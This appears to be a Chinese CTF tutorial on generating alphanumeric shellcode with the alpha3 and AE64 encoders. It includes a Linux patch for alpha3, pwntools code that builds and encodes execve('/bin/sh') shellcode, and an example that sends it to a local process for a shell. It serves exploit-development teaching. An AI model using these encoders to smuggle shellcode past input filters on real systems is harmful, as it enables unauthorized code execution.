

# art of sc

[shellcode](https://xz.aliyun.com/t/6645)

# alphanumeric shellcode
> 原文链接:[纯字符shellcode生成指南](http://taqini.space/2020/03/31/alpha-shellcode-gen/)

*alphanumeric shellcode*(纯字符shellcode)是比较实用的一项技术，因为有些时候程序会对用户输入的字符进行限制，比如只允许输入可见字符，这时就需要用到纯字符的shellcode了。

原理很简单，就是使用**纯字符**对应的**汇编指令**完成shellcode的编写，比如：

| ASCII字符 | Hex  | 汇编指令  |
| --------- | ---- | --------- |
| P         | 0x50 | push %rax |
| Q         | 0x51 | push %rcx |
| R         | 0x52 | push %rdx |
| S         | 0x53 | push %rbx |
| T         | 0x54 | push %rsp |
| U         | 0x55 | push %rbp |
| V         | 0x56 | push %rsi |
| W         | 0x57 | push %rdi |
| X         | 0x58 | pop %rax  |
| Y         | 0x59 | pop %rcx  |
| Z         | 0x5a | pop %rdx  |

其余的就不一一列出了，本篇主要介绍**使用工具编码**，手动编码可以参考以下几篇文章：

* [Alphanumeric shellcode](https://nets.ec/Alphanumeric_shellcode)

* [x86纯字符编码表](https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes)

* [x64纯字符编码表](https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes)

## alpha3

这个工具源码在[google](code.google.com/p/alpha3)上，国内可以选择从[github](https://github.com/SkyLined/alpha3.git)下载。不过官方代码在Linux环境下运行时有些问题：

```bash
% python ALPHA3.py
Traceback (most recent call last):
  File "ALPHA3.py", line 4, in <module>
    import charsets, encode, io
  File "/home/taqini/ctf_tools/alpha3/encode.py", line 1, in <module>
    import ALPHA3
  File "/home/taqini/ctf_tools/alpha3/ALPHA3.py", line 5, in <module>
    import x86, x64, test
  File "/home/taqini/ctf_tools/alpha3/test/__init__.py", line 25, in <module>
    raise OSError("Unsupported platform for testing.");
OSError: Unsupported platform for testing.
```

看下报错信息，发现错误在`test/__init__.py`中，打开源码，发现有个**判断平台**的代码，如果不是`win32`就报错，解决方法很简单，只需要把后两行代码注释掉就行，修改如下：

```python
if (sys.platform == 'win32'):
	# ...
    TEST_SHELLCODE_OUTPUT = "Hello, world!\r\n"
#else:
#  raise OSError("Unsupported platform for testing.");
```

再次运行就正常：

```bash
% python ALPHA3.py
____________________________________________________________________________
      ,sSSs,,s,  ,sSSSs,    ALPHA3 - Alphanumeric shellcode encoder.
     dS"  Y$P"  YS"  ,SY    Version 1.0 alpha
    iS'   dY       ssS"     Copyright (C) 2003-2009 by SkyLined.
    YS,  dSb   SP,  ;SP     <berendjanwever@gmail.com>
    `"YSS'"S'  "YSSSY"      http://skypher.com/wiki/index.php/ALPHA3
____________________________________________________________________________

[Usage]
  ALPHA3.py  [ encoder settings | I/O settings | flags ]

# ...
```

> 修改完之后还需要编译源码，但是编译源码的工具也在google上，如果懒得自己编译，可以直接下载我修改版: https://github.com/TaQini/alpha3
>
> ```bash
> git clone https://github.com/TaQini/alpha3.git
> ```

### 生成shellcode

```python
from pwn import *
context.arch='amd64'
sc = shellcraft.sh()
print asm(sc)
```

将上述代码保存成`sc.py`放到`alpha3`目录下，然后执行如下命令生成待编码的`shellcode`文件

```bash
python sc.py > shellcode
```

> 默认生成的是x64的`sys_execve("/bin/sh",0,0)`，可以修改成其他的arch或shellcode

### x64 alpha编码

生成x64 alpha shellcode

```shell
python ./ALPHA3.py x64 ascii mixedcase rax --input="shellcode"
```

或者用我写的脚本：

```bash
./shellcode_x64.sh rax
```

> 其中输入文件为`shellcode`，`rax`是用于编码的寄存器(shellcode基址)

比如有如下代码：

```nasm
  00101246 48 8d     LEA    RAX,[RBP + -0x410]
           85 f0
           fb ff
  0010124d ff d0     CALL   RAX
  ; ...
```

通过`call rax`跳转到`shellcode`，那么`alpha3`命令中用于编码的寄存器就是`rax`

> `shellcode`的起始地址存在哪个寄存器中，用于编码的寄存器就是哪个

### x86 alpha编码

`alpha3`中x64的`shellcode`只要上述`mixedcase`一种情况，x86的选项比较多：

* x86 ascii uppercase (数字+大写字母)
* x86 ascii lowercase (数字+小写字母)
* x86 ascii mixedcase (数字+大小写字母)

用法与x64相似，不赘述啦~

### 全部编码方式

alpha3支持的所有编码方式如下：

```bash
Valid base address examples for each encoder, ordered by encoder settings,
are:

[x64 ascii mixedcase]
  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI

[x86 ascii lowercase]
  AscLow 0x30 (rm32)        ECX EDX EBX

[x86 ascii mixedcase]
  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]
                            ECX+2 ESI+4 ESI+8
  AscMix 0x30 (i32)         (address)
  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty
                            countslide:EBX+offset~uncertainty
                            countslide:ECX+offset~uncertainty
                            countslide:EDX+offset~uncertainty
                            countslide:ESI+offset~uncertainty
                            countslide:EDI+offset~uncertainty
  AscMix Countslide (i32)   countslide:address~uncertainty
  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3

[x86 ascii uppercase]
  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]

[x86 latin-1 mixedcase]
  Latin1Mix CALL GetPC      call

[x86 utf-16 uppercase]
  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]

```



## AE64

[AE64](https://github.com/veritas501/ae64)是杭电的一位大师傅写的工具，专用于生成64位的aplha shellcode。下载方式：

```bash
git clone https://github.com/veritas501/ae64.git
```

AE64的优势在于编码时可以更加灵活地使用寄存器，但是生成的alpha shellcode比alpha3要更长一些。

此外AE64是python写的，可以直接在python中调用，以下是官方的栗子：

```python
from pwn import *
from ae64 import AE64

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./example1')

obj = AE64()
sc = obj.encode(asm(shellcraft.sh()),'r13')

p.sendline(sc)

p.interactive()
```


